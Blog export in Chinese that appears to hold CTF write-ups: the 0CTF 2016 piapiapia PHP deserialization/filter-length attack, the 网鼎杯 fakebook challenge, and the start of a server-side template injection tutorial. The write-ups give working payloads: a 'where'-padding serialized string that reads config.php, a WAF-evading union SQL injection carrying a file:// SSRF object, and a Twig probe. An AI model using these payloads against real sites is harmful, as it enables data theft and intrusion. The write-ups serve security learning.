src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;register.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Register&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;REGISTER&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后是update.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">		die(&apos;Login First&apos;);	</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">		if(!preg_match(&apos;/^\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class="line">			die(&apos;Invalid phone&apos;);</span><br><span class="line"></span><br><span class="line">		if(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class="line">			die(&apos;Invalid email&apos;);</span><br><span class="line">		</span><br><span class="line">		if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">			die(&apos;Invalid nickname&apos;);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[&apos;photo&apos;];</span><br><span class="line">		if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class="line">			die(&apos;Photo size error&apos;);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class="line">		$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class="line">		$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class="line">		$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class="line">		$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">			&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>核心的处理代码，class.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&apos;config.php&apos;);</span><br><span class="line"></span><br><span class="line">class user extends mysql&#123;</span><br><span class="line">	private $table = &apos;users&apos;;</span><br><span class="line"></span><br><span class="line">	public function is_exists($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::select($this-&gt;table, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	public function register($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = Array(&apos;username&apos;, &apos;password&apos;);</span><br><span class="line">		$value_list = Array($username, md5($password));</span><br><span class="line">		return parent::insert($this-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	public function login($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			return true;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public function show_profile($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		return $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class mysql &#123;</span><br><span class="line">	private $link = null;</span><br><span class="line"></span><br><span class="line">	public function connect($config) &#123;</span><br><span class="line">		$this-&gt;link = mysql_connect(</span><br><span class="line">			$config[&apos;hostname&apos;],</span><br><span class="line">			$config[&apos;username&apos;], </span><br><span class="line">			$config[&apos;password&apos;]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[&apos;database&apos;]);</span><br><span class="line">		mysql_query(&quot;SET sql_mode=&apos;strict_all_tables&apos;&quot;);</span><br><span class="line"></span><br><span class="line">		return $this-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function select($table, $where, $ret = &apos;*&apos;) &#123;</span><br><span class="line">		$sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;</span><br><span class="line">		$result = mysql_query($sql, $this-&gt;link);</span><br><span class="line">		return mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function insert($table, $key_list, $value_list) &#123;</span><br><span class="line">		$key = implode(&apos;,&apos;, $key_list);</span><br><span class="line">		$value = &apos;\&apos;&apos; . implode(&apos;\&apos;,\&apos;&apos;, $value_list) . &apos;\&apos;&apos;; </span><br><span class="line">		$sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function update($table, $key, $value, $where) &#123;</span><br><span class="line">		$sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function filter($string) &#123;</span><br><span class="line">		$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">		$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">		$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">		$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line">		return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = new user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>

<p>最后是config.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">	$config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">	$config[&apos;password&apos;] = &apos;&apos;;</span><br><span class="line">	$config[&apos;database&apos;] = &apos;&apos;;</span><br><span class="line">	$flag = &apos;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>看来flag就是在config.php中了，要想办法拿到config.php的内容了。然后就是代码审计了。<br>这个地方貌似有个文件读取的地方，在profile.php中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&apos;phone&apos;];</span><br><span class="line">		$email = $profile[&apos;email&apos;];</span><br><span class="line">		$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上面还有个反序列化unserialize，感觉有戏，如果$profile[‘photo’]是config.php就可以读取到了，可以对photo进行操作的地方在update.php，有phone、email、nickname和photo这几个。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:8:&quot;sea_sand&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br><span class="line">print_r(unserialize($profile));</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [phone] =&gt; 12345678901</span><br><span class="line">    [email] =&gt; ss@q.com</span><br><span class="line">    [nickname] =&gt; sea_sand</span><br><span class="line">    [photo] =&gt; config.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>可以看到反序列化之后，最后面upload这一部分就没了，下面就是想办法把config.php塞进去了。</p>
<p>从数组顺序上看是和上面数组的顺序一样的，可以抓个包看下post顺序，那么最有可能的就是从nickname下手了。</p>
<p>在设置了$profile之后，用update_profile()函数进行处理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &apos;$username&apos;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>进行了过滤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">		$escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);</span><br><span class="line">		$escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;</span><br><span class="line">		$string = preg_replace($escape, &apos;_&apos;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);</span><br><span class="line">		$safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;</span><br><span class="line"></span><br><span class="line">		return preg_replace($safe, &apos;hacker&apos;, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>有两个正则过滤，带上输入nickname时候有一个正则，总共三个过滤的地方，首先要绕过第一个输入时候的正则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class="line">			die(&apos;Invalid nickname&apos;);</span><br><span class="line">数组即可绕过：</span><br><span class="line">nickname[]=</span><br><span class="line"></span><br><span class="line">那么$profile就是这样了：</span><br><span class="line">$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;xxx&quot;&#125;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>后面的正则要怎么利用呢，可以看到如果我们输入的有where，会替换成hacker，这样的话长度就变了，序列化后的每个变量都是有长度的，那么反序列化会怎么处理呢？我们应该怎么构造呢？</p>
<p>数组绕过了第一个正则过滤之后，如果nickname最后面塞上”;}s:5:“photo”;s:10:“config.php”;}，一共是34个字符，如果利用正则替换34个where，不就可以把这34个给挤出去，后面的upload因为序列化串被我们闭合了也就没用了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">$profile = a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>在where被正则匹配换成hacker之后，正好满足长度，然后后面的”};s:5:“photo”;s:10:“config.php”;}也就不是nickname的一部分了，被反序列化的时候就会被当成photo，就可以读取到config.php的内容了。</p>
<p>下面开始操作：<br>注册之后登陆，进入到update.php页面，输入信息及上传图片，用bp抓包把nickname改成数组即可.<br>然后进入到profile中查看图片信息，把base64码解码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFnezBjdGZfMjAxNl91bnNlcmlhbGl6ZV9pc192ZXJ5X2dvb2QhfSc7Cj8+Cg==</span><br><span class="line"></span><br><span class="line">解码得到：</span><br><span class="line">&lt;?php</span><br><span class="line">$config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;</span><br><span class="line">$config[&apos;username&apos;] = &apos;root&apos;;</span><br><span class="line">$config[&apos;password&apos;] = &apos;qwertyuiop&apos;;</span><br><span class="line">$config[&apos;database&apos;] = &apos;challenges&apos;;</span><br><span class="line">$flag = &apos;flag&#123;0ctf_2016_unserialize_is_very_good!&#125;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="网鼎杯-fakebook"><a href="#网鼎杯-fakebook" class="headerlink" title="网鼎杯 fakebook"></a>网鼎杯 fakebook</h1><ul>
<li>nikto扫描:<code>nikto -host url</code><br>发现隐藏的robots.txt，其中有源码泄漏（/user.php.bak），输入到地址栏，得到文件user.php.bak。然后用御剑扫描，发现flag.php。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user.php.bak源码：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();                                   //初始化一个curl会话</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);                 //设置需要抓取的URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         //设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上</span><br><span class="line">        $output = curl_exec($ch);                            //运行cURL，请求网页</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);          //关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
<p>对注册页面和登陆页面进行post注入探测，发现注册页面中username一栏存在post注入。然后随意注册一个账户，登陆进去以后，发现/view.php?no=1,存在get注入。将no参数改为不存在的值，php报错，得到网站配置文件的后台物理路径/var/www/html/。</p>
<ul>
<li>我选择了post注入，因为先发现了post，所以就用burpsuite截取了post数据包，保存为post.txt.<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /join.ok.php HTTP/1.1</span><br><span class="line">Host: http://f60c34e18065457cab2a8f72a615f74aeed1bc0d1cd84c6d.game.ichunqiu.com/</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Referer: http://f60c34e18065457cab2a8f72a615f74aeed1bc0d1cd84c6d.game.ichunqiu.com/join.php</span><br><span class="line">Cookie: UM_distinctid=1655535613c89-0225b46f53fa79-38694646-100200-1655535613e38; pgv_pvi=3838269440; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1534816179,1534831680,1534834500,1534848123; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; ci_session=b6cdb3f35d0c299c39a2a581c0de505887626935; pgv_si=s4980557824; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1534848148; PHPSESSID=dcgbips79uln77iea8bol6u4d5</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">username=1&amp;passwd=1&amp;age=1&amp;blog=https%3A%2F%2Fwww.csdn.net%2F</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>sqlmap跑一下发现存储的是php序列化的数据.<br>整理出思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。<br>构造注入:<code>view.php?no=0/**/union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code><br>直接用 union select 会被WAF检测到，所以使用 /**/ 来绕过，反序列化字符串对应数据库data列放在第四列（fuzz测试，爆列名），注入后bolg栏显示file:///var/www/html/flag.php，代表注入成功，审计页面源码，发现<iframe width="100%" height="10em" src="data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s3YjY1NzM3Zi04NzA4LTQ2ZmYtODhmOC0wMDY4YzY4NTlhMmN9IjsNCmV4aXQoMCk7DQo=">标签，点击链接，拿到flag。</iframe></p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI</title>
    <url>/2019/12/25/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h1><h2 id="模板注入与常见web注入"><a href="#模板注入与常见web注入" class="headerlink" title="模板注入与常见web注入"></a>模板注入与常见web注入</h2><ul>
<li><p>就注入类型的漏洞来说，常见 Web 注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。下面这段代码足以说明这一点：</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// SQL 注入</span><br><span class="line">$query = &quot;select * from sometable where id=&quot;.$_GET[&apos;id&apos;];</span><br><span class="line">mysql_query($query);</span><br><span class="line">------------- 华丽的分割线 -------------</span><br><span class="line">// 模版注入</span><br><span class="line">$temp-&gt;render(&quot;Hello &quot;.$_GET[&apos;username&apos;]);</span><br></pre></td></tr></table></figure>
</li>
<li><p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<h2 id="模板注入原理"><a href="#模板注入原理" class="headerlink" title="模板注入原理"></a>模板注入原理</h2></li>
<li><p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程，这里我们使用 PHP 模版引擎 Twig 作为例子来说明模板注入产生的原理。考虑下面这段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 Twig 模版引擎渲染页面，其中模版含有   变量，其模版变量值来自于 GET 请求参数 $_GET[“name”] 。显然这段代码并没有什么问题，即使你想通过 name  参数传递一段 JavaScript 代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击.但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;$_GET[&apos;name&apos;]&#125;&quot;);  // 将用户输入作为模版内容的一部分</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
</li>
<li><p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出.</p>
</li>
<li><p>简单的说服务端模板注入的形成终究还是因为服务端相信了用户的输出而造成的（Web安全真谛：永远不要相信用户的输入！）。当然了，第二种情况下，攻击者不仅仅能插入 JavaScript 脚本，还能针对模板框架进行进一步的攻击，此部分只说明原理，在后面会对攻击利用进行详细说明和演示。</p>
<h2 id="模板注入检测"><a href="#模板注入检测" class="headerlink" title="模板注入检测"></a>模板注入检测</h2></li>
<li><p>上面已经讲明了模板注入的形成原来，现在就来谈谈对其进行检测和扫描的方法。如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。如果使用第二份代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).&apos;/../lib/Twig/Autoloader.php&apos;;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line">$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;$_GET[&apos;name&apos;]&#125;&quot;);  // 将用户输入作为模版内容的一部分</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>在 Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入<code>name=20</code> ，则在服务端拼接的模版内容为：<code>Hello 20</code>.Twig 模板引擎在编译模板的过程中会计算<code>20</code> 中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出.<br>现在把测试的数据改变一下，插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>实际服务端要进行编译的模板就被构造为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>这里简单分析一下，由于 <code></code> 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 16  作为模板变量最终会返回 16  作为其值进行显示，因此前端最终会返回内容 <code>Hello IsVuln16OK</code></p>
<ul>
